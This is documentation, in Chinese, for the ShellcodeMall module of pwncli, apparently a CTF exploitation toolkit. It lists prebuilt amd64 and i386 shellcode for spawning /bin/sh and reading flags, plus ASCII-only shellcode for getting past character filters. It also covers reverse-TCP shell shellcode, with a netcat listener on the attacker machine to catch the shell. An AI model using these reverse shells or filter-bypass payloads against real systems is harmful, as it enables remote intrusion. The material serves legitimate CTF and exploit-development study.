

# shellcode — Shellcode 商店

`pwncli/utils/shellcode.py` 提供预编译的常用 shellcode。

***

## 1 amd64

```python
ShellcodeMall.amd64.execve_bin_sh       # 27 字节 execve("/bin/sh", 0, 0)
ShellcodeMall.amd64.execveat_bin_sh     # 29 字节 execveat
ShellcodeMall.amd64.cat_flag            # open("flag") + sendfile
ShellcodeMall.amd64.ls_current_dir      # getdents + write 列目录
```

### ASCII-only shellcode

绕过可打印字符过滤：

```python
sc = ShellcodeMall.amd64.ascii_shellcode(reg="rax")
# reg: shellcode 地址所在寄存器
# 支持: rax/rbx/rcx/rdx/rdi/rsi/rsp/rbp
```

### 反弹 shell

使用前需要先在攻击机上监听对应端口，等待目标连接回来：

```bash
# 攻击机上先开监听（二选一）
nc -lvnp 4444
# 或
ncat -lvnp 4444
```

然后在 exploit 中使用反弹 shell shellcode：

```python
# 仅 connect
sc = ShellcodeMall.amd64.reverse_tcp_connect("192.168.1.1", 4444)

# connect + dup2 + execve("/bin/sh")
sc = ShellcodeMall.amd64.reverse_tcp_shell("192.168.1.1", 4444)
```

其中 IP 和端口填攻击机（即运行 `nc -lvnp` 的机器）的地址。目标执行 shellcode 后会主动连接攻击机，攻击机的 nc 会收到一个交互式 shell。

***

## 2 i386

```python
ShellcodeMall.i386.execve_bin_sh    # 21 字节
ShellcodeMall.i386.cat_flag
ShellcodeMall.i386.ls_current_dir
ShellcodeMall.i386.reverse_tcp_shell("192.168.1.1", 4444)
```

***

## 3 工具

### generate_payload_for_connect

生成 `connect(fd, buf, 0x10)` 的 `sockaddr_in` 结构体：

```python
buf = ShellcodeMall.generate_payload_for_connect("192.168.1.1", 4444)
assert len(buf) == 0x10
```

### shellcode2unicode

```python
s = shellcode2unicode(b"\x31\xc0\x50")  # -> "\\x31\\xc0\\x50"
```
